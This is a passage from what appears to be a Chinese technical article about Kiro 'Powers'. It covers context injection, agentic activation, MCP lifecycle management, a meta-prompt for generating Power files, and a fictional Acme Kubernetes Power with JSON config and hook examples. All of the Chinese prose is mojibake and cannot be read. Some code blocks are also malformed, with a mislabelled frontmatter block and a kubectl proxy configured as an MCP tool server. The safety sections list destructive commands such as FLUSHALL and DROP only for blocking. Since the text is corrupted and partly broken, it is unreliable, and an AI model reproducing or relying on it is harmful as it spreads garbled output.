<li><strong>è¯­ä¹‰å‘é‡æ£€ç´¢</strong>ï¼šç³»ç»Ÿå¯èƒ½å¹¶è¡Œè¿è¡Œä¸€ä¸ªè½»é‡çº§çš„åµŒå…¥æ£€ç´¢ï¼Œå°†ç”¨æˆ·æŸ¥è¯¢çš„å‘é‡ä¸å„ Power çš„ <code>description</code> å‘é‡è¿›è¡Œæ¯”å¯¹ï¼Œä»¥è¯†åˆ«æ²¡æœ‰ç›´æ¥å…³é”®è¯åŒ¹é…ä½†æ„å›¾ç›¸å…³çš„ Powerã€‚</li>
</ul>
</li>
<li>
<p><strong>ä¸Šä¸‹æ–‡æ³¨å…¥ï¼ˆContext Injectionï¼‰</strong> ï¼š</p>
<ul>
<li>ä¸€æ—¦ç¡®å®šç›¸å…³çš„ Powerï¼ˆä¾‹å¦‚ AWS Powerï¼‰ï¼Œç³»ç»Ÿä¼šè¯»å–è¯¥ Power çš„ <code>POWER.md</code> å†…å®¹å’Œ <code>mcp.json</code> å®šä¹‰çš„å·¥å…·åˆ—è¡¨ã€‚</li>
<li>è¿™äº›ä¿¡æ¯è¢«åŠ¨æ€æ’å…¥åˆ°å‘é€ç»™ LLM çš„ç³»ç»Ÿæç¤ºè¯ï¼ˆSystem Promptï¼‰ä¸­ã€‚è¿™æ„å‘³ç€å½“ LLM å¼€å§‹â€œæ€è€ƒâ€å¦‚ä½•å›å¤æ—¶ï¼Œå®ƒå·²ç»â€œçŸ¥é“â€äº†è‡ªå·±æ‹¥æœ‰ AWS ç›¸å…³çš„çŸ¥è¯†å’Œå·¥å…·ã€‚</li>
</ul>
</li>
<li>
<p><strong>æ¨ç†ä¸å›å¤</strong>ï¼šLLM åŸºäºæ³¨å…¥äº†æ–°ä¸Šä¸‹æ–‡çš„æç¤ºè¯ç”Ÿæˆå›å¤æˆ–è°ƒç”¨å·¥å…·ã€‚</p>
</li>
</ol>
<p><strong>ä¸ºä½•ä¸åœ¨å›å¤æ—¶ï¼Ÿ</strong> å¦‚æœ Power åœ¨ AI å›å¤æ—¶æ‰è§¦å‘ï¼ŒAI å°†æ— æ³•ä½¿ç”¨ Power ä¸­çš„å·¥å…·æ¥æ„å»ºå›å¤ï¼Œä¹Ÿæ— æ³•éµå¾ª Power ä¸­çš„æœ€ä½³å®è·µï¼Œè¿™è¿èƒŒäº† Power å­˜åœ¨çš„åˆè¡·ã€‚</p>
<h3 data-id="heading-12">4.2 ä»£ç†å¼å¾ªç¯æ¿€æ´»ï¼ˆAgentic Loop Activationï¼‰</h3>
<p>é™¤äº†ç›´æ¥çš„ç”¨æˆ·è§¦å‘ï¼ŒPower è¿˜å¯ä»¥åœ¨å¤šæ­¥ä»»åŠ¡æ‰§è¡Œè¿‡ç¨‹ä¸­é€šè¿‡<strong>ä»£ç†å¼è¯„ä¼°</strong>è¢«æ¿€æ´»ã€‚</p>
<ul>
<li><strong>åœºæ™¯</strong>ï¼šç”¨æˆ·è¦æ±‚â€œæ„å»ºä¸€ä¸ªå…¨æ ˆåº”ç”¨â€ã€‚</li>
<li><strong>åˆ†è§£</strong>ï¼šä»£ç†å°†ä»»åŠ¡åˆ†è§£ä¸ºâ€œè®¾è®¡æ•°æ®åº“â€ã€â€œæ­å»ºåç«¯â€ã€â€œå¼€å‘å‰ç«¯â€ã€‚</li>
<li><strong>åŠ¨æ€åŠ è½½</strong>ï¼šå½“ä»£ç†å¼€å§‹æ‰§è¡Œâ€œè®¾è®¡æ•°æ®åº“â€å­ä»»åŠ¡æ—¶ï¼Œç³»ç»Ÿä¼šæ ¹æ®ä»»åŠ¡æè¿°ï¼ˆTask Descriptionï¼‰å†æ¬¡è¯„ä¼°å¯ç”¨ Powerã€‚æ­¤æ—¶ï¼Œå³ä½¿åŸå§‹æç¤ºè¯ä¸­æ²¡æœ‰æåˆ°â€œNeon DBâ€ï¼Œä½†ç”±äºå­ä»»åŠ¡æ¶‰åŠæ•°æ®åº“ï¼Œç³»ç»Ÿå¯èƒ½ä¼šè‡ªåŠ¨æ¿€æ´» <code>neon-db</code> Powerã€‚è¿™å®ç°äº†çœŸæ­£çš„â€œä¸Šä¸‹æ–‡éšåŠ¨â€ã€‚</li>
</ul>
<h3 data-id="heading-13">4.3 å†²çªè§£å†³ä¸ä¸Šä¸‹æ–‡å¸è½½</h3>
<ul>
<li><strong>å»æ¿€æ´»ï¼ˆDeactivationï¼‰</strong> ï¼šè¿™æ˜¯ Power ä¸ä¼ ç»Ÿ MCP çš„å…³é”®åŒºåˆ«ã€‚Powers æ˜¯ç¬æ€çš„ã€‚å¦‚æœå¯¹è¯ä»â€œæ•°æ®åº“ä¼˜åŒ–â€è½¬å‘â€œå‰ç«¯æ ·å¼è°ƒæ•´â€ï¼Œç³»ç»Ÿè®¾è®¡æ—¨åœ¨å¸è½½æ•°æ®åº“ç›¸å…³çš„ä¸Šä¸‹æ–‡ï¼Œå¹¶åŠ è½½è®¾è®¡ç›¸å…³çš„ä¸Šä¸‹æ–‡ï¼ˆå¦‚ Figma Powerï¼‰ã€‚è¿™ç§æœºåˆ¶é˜²æ­¢äº†ä¸Šä¸‹æ–‡çª—å£è¢«æ— å…³çš„å†å²æ•°æ®å¡«æ»¡2ã€‚</li>
<li><strong>å¤š Power ååŒ</strong>ï¼šå¦‚æœä»»åŠ¡åŒæ—¶æ¶‰åŠå¤šä¸ªé¢†åŸŸï¼ˆå¦‚â€œå°† Stripe æ”¯ä»˜æ•°æ®å†™å…¥ Supabaseâ€ï¼‰ï¼Œç³»ç»Ÿä¼šåŒæ—¶æ¿€æ´»è¿™ä¸¤ä¸ª Powerï¼Œå‰ææ˜¯æ€» Token æ•°æœªè¶…æ ‡ã€‚å¦‚æœè¶…æ ‡ï¼Œç³»ç»Ÿå¯èƒ½ä¼šæ ¹æ®ä¸å½“å‰ç„¦ç‚¹çš„ç›¸å…³æ€§å¯¹ Power å†…å®¹è¿›è¡Œæˆªæ–­æˆ–æ‘˜è¦ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-14">5. ä¸æ¨¡å‹ä¸Šä¸‹æ–‡åè®®ï¼ˆMCPï¼‰çš„æ·±åº¦è”åŠ¨</h2>
<p>Kiro Power ä¸ MCP çš„å…³ç³»æ˜¯äº’è¡¥çš„ï¼šMCP æä¾›äº†å·¥å…·é€šä¿¡çš„<strong>æ ‡å‡†</strong>ï¼Œè€Œ Power æä¾›äº†å·¥å…·ä½¿ç”¨çš„<strong>ç¼–æ’é€»è¾‘</strong>ã€‚</p>
<h3 data-id="heading-15">5.1 å°è£…ä¸ç”Ÿå‘½å‘¨æœŸç®¡ç†</h3>
<p>Kiro Power å……å½“ MCP æœåŠ¡å™¨çš„å®¹å™¨ã€‚åœ¨ä¼ ç»Ÿè®¾ç½®ä¸­ï¼ŒMCP æœåŠ¡å™¨é€šå¸¸åœ¨å…¨å±€é…ç½®æ–‡ä»¶ ~/.kiro/settings/mcp.json ä¸­å®šä¹‰ï¼Œè¿™æ„å‘³ç€å®ƒä»¬åœ¨ IDE å¯åŠ¨æ—¶åŠ è½½å¹¶ä¸€ç›´é©»ç•™ã€‚</p>
<p>è€Œåœ¨ Power ä¸­ï¼Œmcp.json æ˜¯å±€éƒ¨çš„ã€‚</p>
<p><strong>è”åŠ¨ç”Ÿå‘½å‘¨æœŸè¡¨ï¼š</strong></p>



































<table><thead><tr><th><strong>é˜¶æ®µ</strong></th><th><strong>ä¼ ç»Ÿå…¨å±€ MCP</strong></th><th><strong>Power é›†æˆ MCP</strong></th><th><strong>ä¼˜åŠ¿åˆ†æ</strong></th></tr></thead><tbody><tr><td><strong>æ³¨å†Œ</strong></td><td>ç”¨æˆ·æ‰‹åŠ¨ç¼–è¾‘å…¨å±€ JSON</td><td>å®‰è£… Power æ—¶è‡ªåŠ¨è§£æ</td><td>é™ä½é…ç½®é—¨æ§›ï¼Œå®ç°ä¸€é”®å®‰è£… 9</td></tr><tr><td><strong>å¯åŠ¨</strong></td><td>IDE å¯åŠ¨æ—¶</td><td>Power æ¿€æ´»æ—¶</td><td>èŠ‚çœç³»ç»Ÿèµ„æºï¼Œå‡å°‘åå°è¿›ç¨‹</td></tr><tr><td><strong>ä¸Šä¸‹æ–‡</strong></td><td>å§‹ç»ˆå ç”¨ Token</td><td>ä»…åœ¨ç›¸å…³æ—¶æ³¨å…¥</td><td>é˜²æ­¢ä¸Šä¸‹æ–‡æ±¡æŸ“ï¼Œæé«˜æ¨¡å‹ä¸“æ³¨åº¦</td></tr><tr><td><strong>å¸è½½</strong></td><td>IDE å…³é—­æ—¶</td><td>Power å»æ¿€æ´»æ—¶</td><td>é‡Šæ”¾è¿æ¥å’Œå†…å­˜</td></tr></tbody></table>
<h3 data-id="heading-16">5.2 å¼•å¯¼å±‚ï¼ˆSteeringï¼‰å¯¹ MCP çš„å¢å¼º</h3>
<p>å•çº¯è¿æ¥ä¸€ä¸ª MCP æœåŠ¡å™¨ï¼ˆä¾‹å¦‚æ•°æ®åº“å·¥å…·ï¼‰å¯èƒ½æ˜¯æœ‰é£é™©çš„ï¼Œå› ä¸º AI å¯èƒ½ä¼šæ‰§è¡Œç ´åæ€§æ“ä½œã€‚Power é€šè¿‡ <code>POWER.md</code> ä¸­çš„å¼•å¯¼å±‚å¢å¼ºäº† MCP çš„å®‰å…¨æ€§ä¸å®ç”¨æ€§ã€‚</p>
<ul>
<li><strong>æ“ä½œçº¦æŸ</strong>ï¼š<code>POWER.md</code> å¯ä»¥åŒ…å«æ˜ç¡®æŒ‡ä»¤ï¼Œä¾‹å¦‚ï¼šâ€œå½“ä½¿ç”¨ <code>database_query</code> å·¥å…·æ—¶ï¼Œå§‹ç»ˆå…ˆè¿è¡Œ <code>EXPLAIN</code> åˆ†ææŸ¥è¯¢è®¡åˆ’ï¼Œä¸”ç¦æ­¢åœ¨æœªè·å¾—ç”¨æˆ·æ˜ç¡®è®¸å¯çš„æƒ…å†µä¸‹æ‰§è¡Œ <code>DELETE</code> æˆ– <code>DROP</code> è¯­å¥ã€‚â€</li>
<li><strong>æœ€ä½³å®è·µç»‘å®š</strong>ï¼šå¯¹äº AWS Powerï¼Œ<code>mcp.json</code> æä¾›äº† <code>aws_cli</code> å·¥å…·ï¼Œè€Œ <code>POWER.md</code> åˆ™è§„å®šï¼šâ€œåœ¨ä½¿ç”¨ CLI åˆ›å»º S3 å­˜å‚¨æ¡¶æ—¶ï¼Œå¿…é¡»é»˜è®¤å¯ç”¨åŠ å¯†å’Œç‰ˆæœ¬æ§åˆ¶ã€‚â€ è¿™å°†å·¥å…·èƒ½åŠ›ä¸ä¸šåŠ¡è§„èŒƒç´§å¯†ç»“åˆã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-17">6. é«˜çº§å·¥ä½œæµï¼šåŸºäºç°æœ‰æ–‡æ¡£è‡ªåŠ¨ç”Ÿæˆ Power é…ç½®æ–‡ä»¶</h2>
<p>ç”¨æˆ·æå‡ºäº†ä¸€ä¸ªå‰æ²¿éœ€æ±‚ï¼šâ€œå¦‚ä½•è®© AI æ ¹æ®ç°æœ‰çš„å¼€å‘æˆ–è¿ç»´æ–‡æ¡£è‡ªåŠ¨ç”Ÿæˆè¿™ä¸ª Power é…ç½®æ–‡ä»¶ã€‚â€</p>
<p>ç›®å‰ï¼ŒKiro å°šæœªæä¾›ä¸€ä¸ªç›´æ¥çš„â€œURL è½¬ Powerâ€çš„ä¸€é”®æŒ‰é’®ï¼Œä½†æˆ‘ä»¬å¯ä»¥è®¾è®¡ä¸€ä¸ª<strong>åŸºäºå…ƒæç¤ºè¯ï¼ˆMeta-Promptingï¼‰çš„è‡ªåŠ¨åŒ–å·¥ä½œæµ</strong>æ¥å®ç°è¿™ä¸€ç›®æ ‡ã€‚è¿™ä¸ªè¿‡ç¨‹æ¨¡æ‹Ÿäº†ä¸€ä¸ªé«˜çº§å·¥ç¨‹å¸ˆé˜…è¯»æ–‡æ¡£å¹¶ç¼–å†™é…ç½®æ–‡ä»¶çš„è®¤çŸ¥è¿‡ç¨‹ã€‚</p>
<h3 data-id="heading-18">6.1 â€œæ–‡æ¡£åˆ° Powerâ€çš„è½¬åŒ–ç®¡é“</h3>
<p>è¦å®ç°è‡ªåŠ¨åŒ–ï¼Œæˆ‘ä»¬éœ€è¦æ„å»ºä¸€ä¸ªç®¡é“ï¼Œå°†éç»“æ„åŒ–æ•°æ®ï¼ˆHTMLã€Markdownã€PDF æ–‡æ¡£ï¼‰è½¬åŒ–ä¸ºç»“æ„åŒ–çš„ JSON å’Œ YAMLã€‚</p>
<p><strong>ç®¡é“æ­¥éª¤ï¼š</strong></p>
<ol>
<li><strong>æ‘„å–ï¼ˆIngestionï¼‰</strong> ï¼šå°†ç›®æ ‡å·¥å…·çš„å®˜æ–¹æ–‡æ¡£ï¼ˆå¦‚ API å‚è€ƒã€CLI æ‰‹å†Œã€æœ€ä½³å®è·µæŒ‡å—ï¼‰ä½œä¸ºä¸Šä¸‹æ–‡è¾“å…¥ç»™ Kiroã€‚</li>
<li><strong>è§£æä¸æå–ï¼ˆParsing &amp; Extractionï¼‰</strong> ï¼šAI åˆ†ææ–‡æ¡£ï¼Œæå–æ ¸å¿ƒæ¦‚å¿µï¼ˆç”¨äºå…³é”®è¯ï¼‰ã€å‘½ä»¤ç»“æ„ï¼ˆç”¨äº MCPï¼‰å’Œæ“ä½œè§„èŒƒï¼ˆç”¨äº Steeringï¼‰ã€‚</li>
<li><strong>åˆæˆï¼ˆSynthesisï¼‰</strong> ï¼šå°†æå–çš„ä¿¡æ¯æ˜ å°„åˆ° Kiro Power çš„æ–‡ä»¶æ¶æ„ä¸­ã€‚</li>
<li><strong>éªŒè¯ï¼ˆValidationï¼‰</strong> ï¼šæ£€æŸ¥ç”Ÿæˆçš„ JSON æ˜¯å¦ç¬¦åˆ Schemaï¼ŒYAML æ˜¯å¦æœ‰æ•ˆã€‚</li>
</ol>
<h3 data-id="heading-19">6.2 è‡ªåŠ¨åŒ–ç”Ÿæˆå™¨çš„å…ƒæç¤ºè¯è®¾è®¡ï¼ˆMeta-Promptï¼‰</h3>
<p>æ‚¨å¯ä»¥å°†ä»¥ä¸‹æç¤ºè¯ä½œä¸ºæ¨¡æ¿ï¼Œè¾“å…¥ç»™ Kiroï¼ˆæˆ–ä»»ä½•èƒ½å¤Ÿè®¿é—®æ–‡æ¡£çš„ LLMï¼‰ï¼Œä»¥ç”Ÿæˆ Power æ–‡ä»¶ã€‚</p>
<hr/>
<p><strong>æç¤ºè¯æ¨¡æ¿ï¼š</strong></p>
<blockquote>
<p><strong>è§’è‰²è®¾å®š</strong>ï¼šä½ æ˜¯ä¸€ä½ Kiro Power æ¶æ„ä¸“å®¶ï¼Œç²¾é€š MCP åè®®å’Œ Kiro çš„ä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶ã€‚</p>
<p><strong>ä»»åŠ¡</strong>ï¼šæˆ‘éœ€è¦ä¸º [å·¥å…·/åº“åç§°ï¼Œä¾‹å¦‚ï¼šKubernetes Helm] åˆ›å»ºä¸€ä¸ª Kiro Powerã€‚æˆ‘å·²ç»æä¾›äº†è¯¥å·¥å…·çš„å®˜æ–¹æ–‡æ¡£ï¼ˆè§é™„ä»¶/é“¾æ¥/ä¸‹æ–¹æ–‡æœ¬ï¼‰ã€‚</p>
<p><strong>æ‰§è¡Œæ­¥éª¤</strong>ï¼š</p>
<ol>
<li>
<p><strong>åˆ†ææ–‡æ¡£</strong>ï¼š</p>
<ul>
<li>è¯†åˆ«è¯¥å·¥å…·çš„æ ¸å¿ƒé¢†åŸŸæœ¯è¯­ï¼Œç”¨äºç”Ÿæˆ <code>keywords</code>ã€‚</li>
<li>æå– CLI å‘½ä»¤æˆ– API ç«¯ç‚¹ï¼Œç”¨äºæ„å»º <code>mcp.json</code>ã€‚</li>
<li>æ€»ç»“â€œæœ€ä½³å®è·µâ€ã€â€œæ³¨æ„äº‹é¡¹â€æˆ–â€œå¸¸è§é”™è¯¯â€ï¼Œç”¨äºç¼–å†™ <code>POWER.md</code> å’Œ <code>steering</code> æ–‡ä»¶ã€‚</li>
</ul>
</li>
<li>
<p><strong>ç”Ÿæˆæ–‡ä»¶ç»“æ„</strong>ï¼šè¯·ç”Ÿæˆä»¥ä¸‹æ–‡ä»¶çš„å®Œæ•´ä»£ç å—ï¼š</p>
<ul>
<li>
<p><strong><code>POWER.md</code></strong>ï¼š</p>
<ul>
<li>åŒ…å«ä¸¥æ ¼çš„ YAML Frontmatterï¼ˆname, description, keywordsï¼‰ã€‚</li>
<li>â€œOnboardingâ€éƒ¨åˆ†ï¼šåŸºäºæ–‡æ¡£çš„å®‰è£…/é…ç½®æŒ‡å—ã€‚</li>
<li>â€œCapabilitiesâ€éƒ¨åˆ†ï¼šè¯¥å·¥å…·èƒ½åšä»€ä¹ˆã€‚</li>
<li>â€œSteeringâ€éƒ¨åˆ†ï¼šAI åœ¨ä½¿ç”¨æ­¤å·¥å…·æ—¶å¿…é¡»éµå®ˆçš„è§„åˆ™ï¼ˆä»æ–‡æ¡£çš„è­¦å‘Šéƒ¨åˆ†æå–ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>mcp.json</code></strong>ï¼š</p>
<ul>
<li>å¦‚æœæ–‡æ¡£æåˆ°è¯¥å·¥å…·å·²æœ‰ MCP æœåŠ¡å™¨ï¼Œè¯·ä½¿ç”¨æ ‡å‡†é…ç½®ã€‚</li>
<li>å¦‚æœæ²¡æœ‰ï¼Œè¯·é…ç½®ä¸€ä¸ªåŸºäº CLI çš„é€šç”¨ MCP åŒ…è£…å™¨ï¼ˆä½¿ç”¨ <code>stdio</code> é€šä¿¡æˆ–å‘½ä»¤æ‰§è¡Œï¼‰ã€‚</li>
<li>è®¾ç½® <code>autoApprove</code> åˆ—è¡¨ï¼ŒåŒ…å«æ‰€æœ‰åªè¯»/å‘ç°ç±»å‘½ä»¤ï¼ˆå¦‚ list, get, statusï¼‰ã€‚</li>
<li>è®¾ç½® <code>disabledTools</code>ï¼Œå±è”½æå…¶å±é™©çš„å‘½ä»¤ï¼ˆå¦‚ system prune, formatï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>steering/workflows.md</code></strong>ï¼ˆå¯é€‰ï¼‰ï¼š</p>
<ul>
<li>å¦‚æœæ–‡æ¡£ä¸­æœ‰â€œå¿«é€Ÿå¼€å§‹â€æˆ–â€œæ•™ç¨‹â€ï¼Œå°†å…¶è½¬åŒ–ä¸ºåˆ†æ­¥å·¥ä½œæµæŒ‡å—ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>hooks/auto-lint.kiro.hook</code></strong>ï¼ˆå¯é€‰ï¼‰ï¼š</p>
<ul>
<li>å¦‚æœè¯¥å·¥å…·æ¶‰åŠé…ç½®æ–‡ä»¶ï¼ˆå¦‚ YAML, JSONï¼‰ï¼Œç”Ÿæˆä¸€ä¸ªåœ¨æ–‡ä»¶ä¿å­˜æ—¶è‡ªåŠ¨è¿è¡ŒéªŒè¯å‘½ä»¤ï¼ˆå¦‚ <code>helm lint</code>ï¼‰çš„é’©å­ã€‚</li>
</ul>
</li>
</ul>
</li>
</ol>
<p><strong>çº¦æŸæ¡ä»¶</strong>ï¼š</p>
<ul>
<li>è¾“å‡ºå¿…é¡»æ˜¯æœ‰æ•ˆçš„ Markdown ä»£ç å—ã€‚</li>
<li><code>mcp.json</code> ä¸­çš„ç¯å¢ƒå˜é‡å¿…é¡»ä½¿ç”¨ <code>${VAR_NAME}</code> æ ¼å¼ï¼Œä¸è¦ç¡¬ç¼–ç å¯†é’¥ã€‚</li>
<li>å…³é”®è¯åˆ—è¡¨åº”åŒ…å«è‡³å°‘ 10 ä¸ªé«˜ç›¸å…³æ€§è¯æ±‡ã€‚</li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-20">6.3 è‡ªåŠ¨åŒ–ç”Ÿæˆæ¡ˆä¾‹ç ”ç©¶ï¼šä¸º Redis CLI ç”Ÿæˆ Power</h3>
<p>å‡è®¾æˆ‘ä»¬å°† Redis CLI çš„å¸®åŠ©æ–‡æ¡£è¾“å…¥ç»™ AIï¼Œåº”ç”¨ä¸Šè¿°ç­–ç•¥ï¼Œé¢„æœŸçš„ç”Ÿæˆç»“æœåˆ†æï¼š</p>
<ol>
<li>
<p><strong>å…³é”®è¯æå–</strong>ï¼šAI åº”è¯†åˆ«å‡º "redis", "cache", "key-value", "store", "set", "get", "ttl" ç­‰è¯æ±‡ã€‚</p>
</li>
<li>
<p><strong>MCP é…ç½®é€»è¾‘</strong>ï¼š</p>
<ul>
<li>AI è¯†åˆ«åˆ° <code>redis-cli</code> æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ã€‚</li>
<li>åœ¨ <code>mcp.json</code> ä¸­ï¼Œå®ƒä¼šé…ç½®ä¸€ä¸ª <code>command: "redis-cli"</code>ã€‚</li>
<li><strong>æ™ºèƒ½å®‰å…¨åˆ¤æ–­</strong>ï¼šAI åº”å°† <code>GET</code>, <code>KEYS</code> (æ…ç”¨), <code>INFO</code> æ”¾å…¥ <code>autoApprove</code>ï¼›å°† <code>FLUSHALL</code>, <code>FLUSHDB</code> æ”¾å…¥ <code>disabledTools</code> æˆ–ä¸è‡ªåŠ¨æ‰¹å‡†åˆ—è¡¨ï¼Œå› ä¸ºæ–‡æ¡£é€šå¸¸ä¼šæ ‡è®°è¿™äº›ä¸ºå±é™©æ“ä½œã€‚</li>
</ul>
</li>
<li>
<p><strong>Steering ç”Ÿæˆ</strong>ï¼š</p>
<ul>
<li>æ–‡æ¡£ä¸­å…³äºâ€œç”Ÿäº§ç¯å¢ƒç¦ç”¨ KEYS å‘½ä»¤â€çš„è­¦å‘Šï¼Œä¼šè¢« AI è½¬åŒ–ä¸º <code>POWER.md</code> ä¸­çš„ä¸€æ¡è§„åˆ™ï¼šâ€œDo not use <code>KEYS *</code> in production context; use <code>SCAN</code> instead.â€</li>
</ul>
</li>
</ol>
<h3 data-id="heading-21">6.4 è§£æéç»“æ„åŒ–æ–‡æ¡£çš„æŒ‘æˆ˜ä¸å¯¹ç­–</h3>
<ul>
<li><strong>æŒ‘æˆ˜</strong>ï¼šæ–‡æ¡£æ ¼å¼ä¸ç»Ÿä¸€ï¼Œæœ‰æ—¶ API å‚æ•°åˆ†æ•£åœ¨å¤šä¸ªé¡µé¢ã€‚</li>
<li><strong>å¯¹ç­–</strong>ï¼šä½¿ç”¨ RAGï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰æŠ€æœ¯ã€‚å¦‚æœæ–‡æ¡£é‡å·¨å¤§ï¼ˆå¦‚ AWS æ–‡æ¡£ï¼‰ï¼Œä¸è¦ä¸€æ¬¡æ€§æ”¾å…¥ä¸Šä¸‹æ–‡ã€‚è€Œæ˜¯å…ˆè®© AI ç”Ÿæˆç›®å½•ç´¢å¼•ï¼Œç„¶åé’ˆå¯¹ç‰¹å®šæ¨¡å—ï¼ˆå¦‚â€œS3 CLI Referenceâ€ï¼‰åˆ†åˆ«ç”Ÿæˆ Steering æ–‡ä»¶ï¼Œæœ€ååœ¨ <code>POWER.md</code> ä¸­å¼•ç”¨è¿™äº›å­æ–‡ä»¶ã€‚è¿™ç¬¦åˆ Power çš„â€œåˆ†å±‚å¼•å¯¼â€è®¾è®¡å“²å­¦ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-22">7. æ¡ˆä¾‹ç ”ç©¶ï¼šè®¾è®¡ä¸€ä¸ªå¤æ‚çš„ä¼ä¸šçº§ DevOps Power</h2>
<p>ä¸ºäº†å±•ç¤ºä¸Šè¿°æ‰€æœ‰æ¦‚å¿µçš„ç»¼åˆåº”ç”¨ï¼Œæˆ‘ä»¬å°†è®¾è®¡ä¸€ä¸ªè™šæ„çš„ <strong>"Acme Corp Kubernetes Deployment Power"</strong> ã€‚</p>
<h3 data-id="heading-23">7.1 éœ€æ±‚åœºæ™¯</h3>
<p>Acme å…¬å¸æœ‰ä¸€å¥—å†…éƒ¨çš„ Kubernetes éƒ¨ç½²è§„èŒƒï¼Œè¦æ±‚æ‰€æœ‰ Pod å¿…é¡»æœ‰èµ„æºé™åˆ¶ï¼ˆResource Limitsï¼‰ï¼Œä¸”å¿…é¡»åŒ…å«ç‰¹å®šçš„æ ‡ç­¾ï¼ˆLabelsï¼‰ã€‚å¼€å‘äººå‘˜ç»å¸¸å¿˜è®°è¿™äº›è§„åˆ™ã€‚</p>
<h3 data-id="heading-24">7.2 Power æ–‡ä»¶ç»“æ„è®¾è®¡</h3>
<h2 data-id="heading-25">1. <code>POWER.md</code> (Manifest)</h2>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-comment">## </span>
<span class="hljs-symbol">name:</span> <span class="hljs-string">"acme-k8s-deploy"</span> 
<span class="hljs-symbol">displayName:</span> <span class="hljs-string">"Acme Corp K8s Standard"</span> 
<span class="hljs-symbol">description:</span> <span class="hljs-string">"Enforces Acme Corp's engineering standards for Kubernetes manifests, including mandatory labels and resource quotas."</span> 
<span class="hljs-symbol">keywords:</span> [<span class="hljs-string">"kubernetes"</span>, <span class="hljs-string">"k8s"</span>, <span class="hljs-string">"deployment"</span>, <span class="hljs-string">"pod"</span>, <span class="hljs-string">"service"</span>, <span class="hljs-string">"yaml"</span>, <span class="hljs-string">"acme-deploy"</span>]

<span class="hljs-comment"># Acme K8s Standards</span>

<span class="hljs-comment">## Rules</span>

<span class="hljs-number">1</span>.  **<span class="hljs-title class_">Resource</span> <span class="hljs-title class_">Limits</span>**: <span class="hljs-title class_">Every</span> container <span class="hljs-variable constant_">MUST</span> have <span class="hljs-string">`resources.limits`</span> <span class="hljs-keyword">and</span> <span class="hljs-string">`resources.requests`</span> <span class="hljs-keyword">defined</span>.
<span class="hljs-number">1</span>.  **<span class="hljs-title class_">Labels</span>**: <span class="hljs-title class_">Every</span> metadata block <span class="hljs-variable constant_">MUST</span> contain <span class="hljs-string">`app.kubernetes.io/owner`</span>.
<span class="hljs-number">1</span>.  **<span class="hljs-title class_">Images</span>**: <span class="hljs-title class_">Always</span> use <span class="hljs-variable constant_">ECR</span> paths <span class="hljs-string">`123456.dkr.ecr.us-east-1.amazonaws.com/...`</span>, never <span class="hljs-keyword">public</span> <span class="hljs-title class_">Docker</span> <span class="hljs-title class_">Hub</span>.
</code></pre>
<h2 data-id="heading-26">2. mcp.json (Tooling)</h2>
<p>é…ç½® kubectl ä½œä¸ºå·¥å…·ï¼Œä½†é™åˆ¶å…¶æƒé™ã€‚</p>
<pre><code class="hljs language-JSON" lang="JSON"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcpServers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"kubectl-wrapper"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"kubectl"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"proxy"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"--port=8080"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> 
      <span class="hljs-attr">"disabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"autoApprove"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"get_pods"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"describe_service"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"logs"</span><span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ol start="3">
<li>hooks/validate-k8s-yaml.kiro.hook (Automation)</li>
</ol>
<p>å½“ç”¨æˆ·ä¿å­˜ YAML æ–‡ä»¶æ—¶ï¼Œè‡ªåŠ¨æ£€æŸ¥æ˜¯å¦ç¬¦åˆå…¬å¸è§„èŒƒã€‚</p>
<pre><code class="hljs language-JSON" lang="JSON"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Validate K8s Manifest"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"when"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"fileSaved"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"patterns"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"k8s/*.yaml"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"helm/**/*.yaml"</span><span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"then"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"askAgent"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"prompt"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Check this YAML file against Acme Corp's standards defined in POWER.md. Specifically look for missing resource limits and owner labels. If violations are found, suggest strict fixes."</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-27">7.3 å·¥ä½œæµæ¼”ç¤º</h3>
<ol>
